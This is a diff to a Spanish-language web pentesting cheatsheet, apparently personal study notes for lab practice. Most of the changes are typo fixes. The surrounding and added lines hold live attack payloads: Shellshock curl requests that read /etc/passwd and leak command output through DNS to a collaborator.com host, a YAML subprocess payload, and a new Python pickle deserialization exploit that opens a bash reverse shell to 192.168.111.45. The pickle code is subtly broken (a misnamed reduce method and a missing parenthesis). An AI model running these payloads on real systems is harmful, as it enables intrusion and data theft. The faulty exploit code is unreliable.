@@ -196,7 +196,7 @@ python3 -m http.server 80
 
 ## XXE
 
-> Utilizamos **https://github.com/jbarone/xxelab.git** para jugar
+> Utilizamos https://github.com/jbarone/xxelab.git para jugar
 
 - Inyección XXE para visualizar archivo 
 ```DTD
@@ -301,7 +301,7 @@ rm response 2>/dev/null
 
 ## Local File Inclusion - Path Traversal
 
->Si la web a auditar tiene el siguiente código
+>Si la web a auditar tiene el siguiente código, fijarnos en **include()**
 
 ```php
 <? php
@@ -593,7 +593,7 @@ print(js_code)
 ----
 ## Padding Oracle
 
-> Ataque contra datos cifrados que permite al atacante descifrar los datos
+> Ataque contra datos cifrados que permite al atacante descifrarlos
 
 1. Utiliza **CBC: Cipher BlockChaining**
 
@@ -684,7 +684,7 @@ $value2 = 0
 # Por lo tanto 0 = 0
 ```
 
-- Se debe poner `===` para que iguale los int(tipo de dato número)
+- En la sanitización se debe poner `===` para que iguale los int(tipo de dato número)
 
 - Crackeo: si hasheamos una palabra que empiece por 0, no comparará todo el string del hash si no sólo el 0 del primero, **a la aplicación le debemos de dar la palabra sin hashear**
 
@@ -800,7 +800,7 @@ $pingTest = new pingTest;
 $pingTest->validate();
 ```
 
-- Creamos nuestro código, lo mandamos en el **repeater **
+- Creamos nuestro código, lo mandamos en el **repeater**
 > nano serializeattack.php
 
 ```php
@@ -932,7 +932,7 @@ sudo apt install popler-utils
 
 > Command Injection
 
--  [PayloadAllTheThingsLaTeX](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md)
+- [PayloadAllTheThingsLaTeX](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md)
 - [SalomonSecLaTeX](https://salmonsec.com/cheatsheets/exploitation/latex_injection)
 - [HAckTricksLaTeX](https://book.hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html)
 
@@ -1281,7 +1281,7 @@ curl http://127.0.0.1:3306 --proxy http://targetip:3128 --output salida
 ```
 - Para ejecución de comandos poner ruta absoluta y jugar con los **echo;**
 ```bash
-curl -s -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable
+curl -s -H "user-agent: () { :; };  echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable.sh
 curl -s -H "user-agent: User-Agent: () { :; }; /usr/bin/nslookup $(ls).$(echo "<>").collaborator.com" http://localhost:8080/cgi-bin/vulnerable
 ```
 
@@ -1411,10 +1411,8 @@ Origin: **
 <p id="stolenInfo"></p>
 ```
 
-> Se supone que al ir a mi localhost/tumadre.html
-> la página se pintaba igual que lo que visitaba la víctima en /confidential
 
-- Si quiere pintarlo bonito sólo tienes que esperar a que  lleguen  peticiones d ela víctima con sus directorios y archivos
+- Si quiere pintarlo bonito sólo tienes que esperar a que  lleguen  peticiones de la víctima con sus directorios y archivos y copiarlos todos con el mimso nombre aunque no tengan contenido
 
 ## SQL Truncation
 
@@ -1485,7 +1483,7 @@ while true; do curl -s X GET 'http://localhost:5000/?action=run' | grep "Check t
 heck this out: uid=0(root) gid=0(root) grupos=0(root)
 ```
 
-## CSSI - Inyeccione sCSS
+## CSSI - Inyecciones CSS
 
 >Si hay un parámetro que te cambia el color o forma del output, podemos enchufarle esto
 
@@ -1501,3 +1499,37 @@ heck this out: uid=0(root) gid=0(root) grupos=0(root)
 ```bash
 echo -n "YAML: !!python/object/apply:subprocess.check_output ['ls']" | base64 -w 0 ; echo
 ```
+
+## Python - Deserialization Pickle Library
+
+>Representa objetos de python en una cadena de bytes
+
+Según lo que el backend pida, en este caso parte de que la cadena debe ser hexadecimal para que por detrás lo encodee, pegaremos en la web lo que nos dé este output
+
+```python
+import pickle
+import os
+import binascii
+
+class Exploit(object):
+	def _reduce_(self):
+		return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.111.45/443 0>&1"',))
+
+if __name__ == '__main__':
+	print(binascii.hexlify(pickle.dumps(Exploit()))
+```
+
+## GraphQL , Introspection, mutation, IDOR
+
+>**GraphQL:** Lenguaje de consulta en tiempo de ejecución para las API
+
+### Introspection
+
+>Cuando haya introspección se lo podemos mandar al **repeater** en burp o podemos consultar [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html) y pegar en la url una de sus consultas
+
+>Si hay respuesta copiamos la respuesta en [Vayaguer](https://graphql-kit.com/graphql-voyager/) y la pegamos o la mandamos a  la extensión GraphQL en **BurpSuite**
+
+### Mutation
+
+>Podemos cambiar valores como si de un IDOR se tratase, para impersonar a alguien a diferencia de las consultas las mutaciones permiten modificar datos
+
